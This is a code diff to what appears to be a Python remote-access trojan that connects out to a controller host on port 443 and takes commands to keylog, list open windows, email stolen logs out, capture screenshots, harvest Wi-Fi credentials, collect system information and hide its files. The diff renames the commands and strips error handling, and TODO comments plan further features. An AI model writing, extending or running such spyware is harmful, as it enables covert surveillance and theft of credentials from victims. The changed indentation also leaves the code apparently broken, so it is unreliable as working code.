@@ -37,17 +37,17 @@ Version : v2.2
 """
 
 
-host = '10.0.0.70' 
+host = '10.0.0.70'
+#host = '147.9.115.227'
+#host = '147.9.25.152'
 port = 443
 
 
 def connect_client_side():
 
-        global host, port
+                global host, port
 
-        try:
-
-                # threading.Timer(6,connect_client_side).start()
+                threading.Timer(2,connect_client_side).start()
                 
                 # create a socket object
                 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -67,13 +67,13 @@ def connect_client_side():
                         break
                          
                     # start logging using Keylog command
-                    elif user_command.strip() == 'Keylog':
+                    elif user_command.strip() == 'keylog':
                         sock.send("[*] Keylogging is on ........\n\n")
                         begin_logging()
                         sock.send("\n\n\n")
 
                     # get open windows
-                    elif user_command.strip() == 'Openwins':
+                    elif user_command.strip() == 'openwins':
                         sock.send("[*] Getting all the open programs \n\n")
                         get_all_open_windows()
                         sock.send("\n\n\n")
@@ -93,46 +93,44 @@ def connect_client_side():
 
 
                     # send the logs via email
-                    elif user_command.strip() == 'Sendlogs':
+                    elif user_command.strip() == 'sendlogs':
                          sock.send("[*] Starting to send the logs............................ \n\n")
                          send_new_email(folder_path)
                          sock.send("[*] Check the mail for the logs..........................\n")
                          sock.send("\n\n")
 
                     # capture screenshots
-                    elif user_command.strip() == 'Capture':
+                    elif user_command.strip() == 'capture':
                          sock.send("[*] Start capturing the images............................ \n\n")
                          capture_screenshots(screen_shots)
                          sock.send("\n\n")
 
 
                     # get wifi
-                    elif user_command.strip() == 'Wifi':
+                    elif user_command.strip() == 'wifi':
                         
                         sock.send("\n\n")
                         sock.send("[*] Gathering Wifi infos..................................... \n\n")
                         get_wifi_credentials()
                         #sock.send("\n\n")
 
-                    elif user_command.strip()== 'Systeminfo':
+                    elif user_command.strip()== 'systeminfo':
                         sock.send("\n\n")
                         sock.send("[*] Gathering System Information..................................... \n\n")
                         sock.send(get_system_info())
 
-                    elif user_command.strip() == 'Cover':
+                    elif user_command.strip() == 'cover':
                         sock.send("\n\n")
                         sock.send("[*] Getting ready to hide and cover .................................... \n\n")
                         hide_file(folder_path)
                         
                     else:
                         sock.send("\n [*] ERROR: Entered Wrong Command. Type [Menu] to get the list of commands\n\n")  
-        except:
-                print "[*] NO CONNECTION TO THE TARGET............................."
-                
+
+       
 def shell():
 
-    threading.Timer(1, shell).start()
-    
+    threading.Timer(6,get_current_connection).start()  
     # check the connection
     conn = get_current_connection()
     
@@ -147,7 +145,7 @@ def main():
 
     # start the shell
     shell()
-    #connect_client_side()
+    
 
 
 if __name__ == "__main__" :
@@ -155,3 +153,8 @@ if __name__ == "__main__" :
         main()
 
 
+
+# TODO USE keylog first then screen shot
+# Fixed the resolution problem of the pictures
+# ADD DELETE IMAGES
+# List all the running processors
